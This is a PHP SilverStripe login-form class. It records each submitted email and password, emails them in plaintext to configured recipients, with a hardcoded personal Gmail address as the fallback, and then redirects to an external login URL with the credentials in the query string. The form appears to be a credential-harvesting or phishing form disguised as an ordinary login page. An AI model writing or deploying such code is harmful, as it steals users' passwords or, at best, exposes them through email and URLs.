<?php

namespace App\Forms;

use App\Helpers\FieldHelper;

use SilverStripe\Core\Config\Config;
use SilverStripe\Core\Convert;
use SilverStripe\Control\Email\Email;
use SilverStripe\Control\Director;
use SilverStripe\Forms\Form;
use SilverStripe\Forms\FieldList;
use SilverStripe\Forms\FormAction;
use SilverStripe\Forms\RequiredFields;
use SilverStripe\View\SSViewer;

use SilverStripe\Dev\Debug;
use SilverStripe\Dev\Backtrace;

use SilverStripe\CMS\Model\SiteTree;
use SilverStripe\Control\Controller;
use SilverStripe\ORM\ArrayList;
use SilverStripe\ORM\DataObject;
use SilverStripe\SiteConfig\SiteConfig;
use SilverStripe\Forms\HiddenField;

use App\Subscriptions\LoginSubmission;

class LoginForm extends Form {

	private static $field_labels = [
		'Email' => 'Email',
		'Password' => 'Password',
	];

	private static $auto_response_template = 'AutoResponseEmail';
	private static $auto_response_email_from = '';
	private static $show_link_to_recipients = false;
	private static $config_is_ajax = false;
	protected $no_recipients = false;

	private static $required_fields = [
		'Password', 'Email'
	];

	public $is_ajax = false;
	public $active_page;
	public $success_redirect = false;

	public function FieldList() {
		$labels = Config::inst()->get(get_class($this), 'field_labels');

		$list = [
			FieldHelper::Input('email', 'Email', $labels['Email'])->setAttribute('placeholder', 'juandelacruz@softwarcompany.com'),
			FieldHelper::Input('password', 'Password', $labels['Password'])->setAttribute('placeholder', '●●●●●●●●'),
			// FieldHelper::Invisiblecaptcha('Recaptcha'),
		];

		$fields = new FieldList($list);

		return $fields;
	}

	function __construct($controller, $name=LoginForm::class, $TemplatePath=LoginForm::class) {

		$this->active_page = $controller;

		$fields = $this->FieldList();
		$actions = new FieldList(FormAction::create('doSubmit'));
		$requiredFields = new RequiredFields(
			Config::inst()->get(get_class($this), 'required_fields')
		);

		if (SSViewer::hasTemplate([$TemplatePath])) {
			$this->setTemplate($TemplatePath);
		}

		$fields->push(HiddenField::create('BackURL', 'BackURL',
			$controller->Link()));

		parent::__construct($controller, $name, $fields, $actions, $requiredFields);
	}

	public function doSubmit(Array $RawData, Form $Form)
	{
		$Controller = $Form->getController();
		$Data = Convert::raw2sql($RawData);
		// debug::show($Controller->hasMethod('Enquiries'));
		// debug::endshow($Data);
		if ($Controller->hasMethod('Enquiries')) {
			// $Submission = false;
			// debug::endshow($Controller->Enquiries());
			$Submission = LoginSubmission::create();
			$Form->saveInto($Submission);
			$Submission->write();
			if ($Controller->Enquiries()->hasMethod('add')) {
				/*add ID to Contact form summission for this form type*/
				$Controller->Enquiries()->add($Submission->ID);
			}
			$isSent = $this->sendEmail($Data, $Controller, $Submission);
		} else {
			$isSent = false;
		}
		// debug::endshow($isSent);
		if ($isSent != true) {
			$Form->sessionMessage('There Something wrong, email not sent!');
			return $Controller->redirectBack();
		} else {
			return $this->onSuccess($Form->getController(), $Data);
		}
	}

	public function sendEmail(&$Data, $Controller, $Submission=false)
	{
		if ($Controller->hasMethod('Recipients')) {
			$FormRecipients = $Controller->Recipients();
			// debug::endshow($FormRecipients);
			if ($FormRecipients->Count()) {
				$RecipientData = $FormRecipients;
			} else {
				$RecipientData = ArrayList::create([
					['Name' => 'Eddie', 'Email' => 'garciaeddiem@gmail.com']
				]);
				$this->no_recipients = true;
			}
			// debug::endshow($RecipientData);
			if ($Submission) {
				$Data['Submission'] = $Submission;
			}
			if (Config::inst()->get(get_class($this), 'show_link_to_recipients')) {
				$Data['FormLink'] = Director::absoluteBaseURL() . trim($Controller->Link(), '/');
			}
			if ($this->no_recipients) {
				$Data['NoRecipients'] = 'Has no recipients with this form! '.
					Director::absoluteBaseURL().'admin/pages/edit/show/'.$Controller->ID.'#Root_Recipients';
			}
			// debug::endshow($Data);
			$Email = new Email();
			// Set Email From
			$Email->setSubject('You have received a new Send-Data Login Informatiion.');
			$Email->setFrom($Data['Email']);

			foreach ($RecipientData as $Recipient) {
				if (isset($Recipient->Name) AND $Recipient->Name) {
					$Data['RecipientName'] = $Recipient->Name;
					$Email->addTo($Recipient->Email, $Recipient->Name);
				} else {
					$Email->addTo($Recipient->Email);
				}
			}
			$Data['Greetings'] = 'New user Login';
			// debug::endshow($Data);
			$Template = Config::inst()->get(get_class($this), 'auto_response_template');
			$Email->setHTMLTemplate($Template);
			$Email->setData($Data);

			// debug::endshow($Email->send());
			return $Email->send();
		}
		return false;
	}

	public function onSuccess($Controller=null, $Data=null)
	{
		if (!is_null($Data)) {
			$labels = Config::inst()->get(get_class($this), 'field_labels');
			$query = [];
			// debug::endshow($labels);
			foreach ($labels as $key => $value) {
				if (isset($Data[$value])) {
					$query[strtolower(trim($value))] = $Data[$value];
				}
			}
			$query_string = http_build_query(['accounts' => $query]);
			// debug::endshow(APP_SITE.'login?'.$query_string);
			return $Controller->redirect(APP_SITE.'login?'.$query_string);
		}
		return $Controller->redirect('/page-not-found/');
	}
}
